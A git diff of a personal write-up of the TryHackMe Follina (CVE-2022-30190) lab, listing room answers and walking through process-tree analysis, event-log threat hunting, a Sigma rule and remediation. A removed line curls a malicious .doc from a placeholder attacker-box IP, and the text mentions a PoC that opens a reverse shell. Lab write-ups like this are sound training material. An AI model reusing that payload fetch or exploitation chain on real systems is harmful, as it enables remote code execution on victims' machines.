@@ -5,7 +5,9 @@ CVE-2022-30190 . Windows . RCE vulnerability in MSDT service</h1>
 <em>A walkthrough on the CVE-2022-30190, the MSDT service, exploitation of the service vulnerability,<br>and consequent detection techniques and remediation processes</em>.  Access it <a href="https://tryhackme.com/room/follinamsdt">here</a>.<br>
 Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, 
 and I’m excited to join you on this adventure, part of my <code>442</code>-day-streak in<a href="https://tryhackme.com">TryHackMe</a>.<br><br>
-<img width="1200px" src=""></p>
+<img width="1200px" src="https://github.com/user-attachments/assets/20feb5dc-cfd9-454f-b6b4-7b2d254dc1a7"></p>
+
+
 
 <br>
 
@@ -27,6 +29,7 @@ and I’m excited to join you on this adventure, part of my <code>442</code>-day
 <p>1.1. Hope you enjoy this room<br>
 <code>No answer needed</code></p>
 
+<br>
 
 <h2>Task 2 . CVE-2022-30190</h2>
 <p>The MSDT exploit is not something new - in fact, a bachelor’s thesis has been published August of 2020 regarding techniques on how to use MSDT for code execution. Almost two years after that initial publication, pieces of evidence of MSDT exploitation as well as code execution via Office URIs has triggered several independent researchers to file separate reports to MSRC, the latter of which has been patched (specifically in Microsoft Teams) whereas the former remained vulnerable.<br>
@@ -223,12 +226,14 @@ Combining the two and then abusing them will result in an attack vector that we�
 <img width="683" height="53" alt="image" src="https://github.com/user-attachments/assets/49dea496-e3d0-48b3-8c6e-81b463ae50c8" />
 
 <br>
+<br>
 
 <p>4.2. What is the filename of the .docx file that has been discovered in the wild? Write it exactly as you see it.
 
 Fun fact: The last part of the filename is actually the area code of Follina, Italy which is where this vulnerability got it's name from. <em> Hint : External Research Required<br>
 <code>05-2022-0438.doc</code></p>
 
+<br>
 <br>
 
 <p>4.3. The PoC that we used has the capability to establish a reverse shell upon exploit - what binary is being used to accomplish this? <em>Check the follina.py file</em><br>
@@ -238,6 +243,7 @@ Fun fact: The last part of the filename is actually the area code of Follina, It
 
 
 <br>
+<br>
 
 <p>4.4. Where is this binary being downloaded?<br>
 <code>C:\Windows\Tasks</code></p>
@@ -245,6 +251,7 @@ Fun fact: The last part of the filename is actually the area code of Follina, It
 
 <img width="1259" height="162" alt="image" src="https://github.com/user-attachments/assets/4780ea8f-8444-4f6f-9982-277589af60b0" />
 
+<br>
 <br>
 
 <p>4.5. In the original exploit execution, two parent processes are of interest in the list of running processes in Process Explorer, one of them is WINWORD.EXE. Can you find the other one?<br>
@@ -255,12 +262,14 @@ Fun fact: The last part of the filename is actually the area code of Follina, It
 <img width="1077" height="341" alt="image" src="https://github.com/user-attachments/assets/e619db97-398a-43f0-acfd-c7a5412c3a7b" />
 
 <br>
+<br>
 
 <p>4.6. What is the child process of WINWORD.EXE?<br>
 <code>msdt.exe</code></p>
 
 <img width="1076" height="450" alt="image" src="https://github.com/user-attachments/assets/e8e58f97-2111-4e5f-90ce-328bee22cbc2" />
 
+<br>
 <br>
 
 <p>4.7. What is the child process of the other interesting parent process?<br>
@@ -269,23 +278,154 @@ Fun fact: The last part of the filename is actually the area code of Follina, It
 <img width="1076" height="236" alt="image" src="https://github.com/user-attachments/assets/4baa7860-280f-4c12-a41d-9a641e5d5f2f" />
 
 <br>
+<br>
 
 <p>4.8. What process would be the most obvious piece of evidence to conclude that the "Zero Click" implementation of the exploit was used?<br>
 <code>prevhost.exe</code></p>
 
 <img width="770" height="231" alt="image" src="https://github.com/user-attachments/assets/ef2b62ca-18c5-4e69-b521-8edbc9e1da11" />
 
+<br>
+<br>
+
+<h2>Task 5 . Detection</h2>
+<h3>Threat hunting</h3>
+<p>﻿The Windows machine that we’ve used to study the exploitation of the vulnerability has been pre-configured to have logging enabled for:<br>
+
+- Audit Process Creation<br<
+- Command Line Process Auditing, and<br>
+- Script Block Logging</p>
+
+<p>These auditing mechanisms are not configured by default and as such, it is imperative that these are turned on in your own environments to aid in the detection of suspicious behavior, and to help keep valuable data available for forensic examiners.<br>
+
+During the previous task, we've identified a number of interesting process creations upon the exploitation of the vulnerability. These process creations are logged in Windows Security Logs, ready to be analyzed via your favorite viewer, or forwarded to a centralized log collector to be processed then further used later on.<br>
+
+For this task we'll be using Event Log Viewer for Windows by Nirsoft to check out the process creations we've identified earlier. We will then look for details within these process creations that we can use to look for clues in other event logs to explain better what happened behind the scenes. The Event Log Viewer has been pinned in the Taskbar for you.<br>
+
+Proceed to open FullEventLogView pinned in your taskbar. Go to View > Use Quick Filter. A search bar should appear on top of the logs which would allow us to do quick searches. Since we wanted to check the details of our process creations, we can click on the left-most drop down menu and choose Find Event ID (space/comma...), then type 4688 to the search bar provided as shown below:</p>
+
+<img width="793" height="130" alt="image" src="https://github.com/user-attachments/assets/6f7ba793-590d-4740-bb3f-8ac6f3576810" />
+
+<p>The screen should populate with Process Creation events and you'll notice immediately  that there's a ton of them, despite having minimal interaction with the machine.</p>
+
+<img width="354" height="143" alt="image" src="https://github.com/user-attachments/assets/faefcd09-30d6-4bd7-ab3c-906875a0ebf3" />
+
+<p>The first artifact we'll check is winword.exe - understanding the flow of events from this process gives us an idea how an office process in general, will behave in the context of an msdt exploitation. Hit Ctrl+F to spawn a Find function and type in winword.<br>
+
+The first entry that you'll probably see is the one where WINWORD.EXE is the new process being created, identified by the detail: New Process Name. This process marks the opening of the follina.docx file, via by the detail: Process Command Line. It should look like the one below, though it's completely normal for it not to look exactly the same.</p>
+
+<img width="1190" height="116" alt="image" src="https://github.com/user-attachments/assets/bc50e7d1-e8b3-43f6-91da-8fafa6f29cdc" />
+
+<p>Click the Find Next button until you find an entry that looks something like this:</p>
+
+<img width="1831" height="134" alt="image" src="https://github.com/user-attachments/assets/162f4954-1dac-44c9-af97-fa4a6800b360" />
+
+<p>Here we'll see that the WINWORD.EXE is the Creator Process, more commonly known as the Parent Process of msdt.exe. Notice the long command line entry that contains multiple PowerShell cmdlets (pronounced command-lets) as well as multiple directory traversals. Seeing this, on its own, in your environment should raise immediate red flags. One free nugget that we can look closely here is the string Y2FsYw== that when decoded would result in the string calc.<br>
+
+Since we saw PowerShell cmdlets, it would make sense for us to filter out PowerShell events to further check this lead. Since there's a lot of unique event IDs that log PowerShell events, we can filter via Provider. Go to Options > Advanced Options. Click the second dropdown menu and select Show only the specific providers (comma-delimited...). Type PowerShell enclosed with wildcards (*) so all providers with regards to PowerShell will be included.</p>
+
+<img width="631" height="456" alt="image" src="https://github.com/user-attachments/assets/3cedfe7d-9684-43e8-b712-6a7bcc32da85" />
 
 
+<p>Clear the "Quick Filter" box of the 4688 we entered earlier, and the screen should populate with events that exclusively come from PowerShell providers. From here, we can filter the events via part of the PowerShell command we've noted above.</p>
 
 
-```bash
-Microsoft Windows [Version]
-(c) 2018 Microsoft Corporation. All rights reserved.
+<img width="1672" height="259" alt="image" src="https://github.com/user-attachments/assets/e05cce80-2514-4540-a861-def359769817" />
 
-C:\Users\Administrator> cd Desktop
-C:\Users\Administrator\Desktop> curl http://[attackbox IP]:3456/follina.doc -o follina.docx
-```
+<p>Upon arriving in this event, we can close the find function and then proceed to follow the trail of this Scriptblock text; you can navigate to the next event by pressing the down key in your keyboard, or manually clicking the event. Exploring the immediate events that follow this scriptblock text will show the step-by-step execution of calc in the perspective of PowerShell.<br>
+
+There's still a lot to be explored in the above scriptblock alone but for the sake of brevity, it will be left to the student to explore further and see what else they can uncover. Questions at the end of this task may serve as guide as well.</p>
+
+<h3>Sigma rule availability</h3>
+
+<p>Huntress Detection Engineer Matthew Brennan has created a sigma rule to detect suspicious MSDT executions in the environment and the best thing about it is that it keeps getting updated whenever the community spots something new.<br>
+
+The sigma rule can be found here.<br>
+
+
+Uncoder.IO is a nice tool that helps convert sigma rules to queries that can be immediately used within a SIEM of your choice.<br>
+
+In hunting for MSDT exploits around the environment, you may opt to use the sigma rule as a detection mechanism for both:<br>
+
+- Analytics for use in near real time detections of exploits, and<br>
+- Retroactive checks of prior intrusions<br><br>
+
+MSDT also uses another binary to channel executions and so, suspicious child processes with it as the parent should be noted and further investigated. The "redacted" information above is an answer to a question in the previous task - check at your own spoilage.<br><br>
+
+Further reading:<br>
+
+- Detecting Follina: Microsoft Office remote code execution zero-day</p>
+
+
+<h3 align="left"> Answer the questions below</h3>
+
+<br>
+<p>5.1. What encoding is used in the string Y2FsYw==<br>
+<code>base64</code></p>
+
+<br>
+
+<p>5.2. What is the parent process of calc.exe?<br>
+<code>sdiagnhost.exe</code></p>
+
+<br>
+
+<p>5.3. iagnostic package index information is loaded from what file path?<br>
+<code>C:\Windows\Diagnostics\Index</code></p>
+
+<br>
+
+<h2>Task 6 . Remediation</h2>
+<p>[ ... ]</p>
+
+<h3 align="left"> Answer the question below</h3>
+
+<br>
+<p>6.1. What error message did the document give upon opening? That error that you've just noticed, had you not known that we're doing an experiment here, is called an Indicator of Attack. You must be very cautious of these kinds of error messages in your own environments.<br>
+<code>You'll need a new app to open this ms-msdt</code></p>
+
+<img width="1314" height="277" alt="image" src="https://github.com/user-attachments/assets/eff9d242-e83f-40d0-9b69-daa85333fd49" />
+
+
+<img width="1515" height="337" alt="image" src="https://github.com/user-attachments/assets/49d50320-4646-463d-abef-d003e3406347" />
+
+<br>
+
+
+<h2>Task 7 . Room Recap + Recent Developments</h2>
+<p>This room explored the MSDT Service and its vulnerability history. It touched upon the idea that features, no matter the intended purpose, will be abused sooner or later. There is no shortage of creativity in this industry, and every so often, exploitation of vulnerabilities such as this is being discovered in the wild.<br>
+
+This room has also emphasized the importance of establishing a proper baseline and consequently explored threat hunting techniques that are transferrable in most environments through the use of simple tools that can easily be downloaded and deployed. This is closely followed by a threat hunting challenge that can be solved by following said techniques.<br>
+
+Finally, a couple of remediation processes that are both straightforward and easily deployable has been the chosen method of closing this topic.<br>
+
+As of room publishing, Microsoft has already released a patch that blocks PowerShell injection, effectively disabling that attack vector.<br>
+
+This room will be updated from time to time.</p>
+
+<h3 align="left"> Answer the question below</h3>
+
+<br>
+<p>7.1. See you again soon, and happy hunting!<br>
+<code>No answer needed</code></p>
+
+<br>
+<br>
+
+<img width="1892" height="879" alt="image" src="https://github.com/user-attachments/assets/e6ecc369-02a3-4d16-bbac-099d758b7172" />
+
+<img width="1888" height="901" alt="image" src="https://github.com/user-attachments/assets/3de9c2cb-d062-4302-929a-6ae3c4f9434b" />
+
+<br>
+
+<div align="center">
+
+| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
+| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
+|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
+| July 20, 2025     | 440      |     153ʳᵈ    |      5ᵗʰ     |    180ᵗʰ    |     7ᵗʰ    | 115,655 |    867    |    72     |
+
+</div>
 
 
 
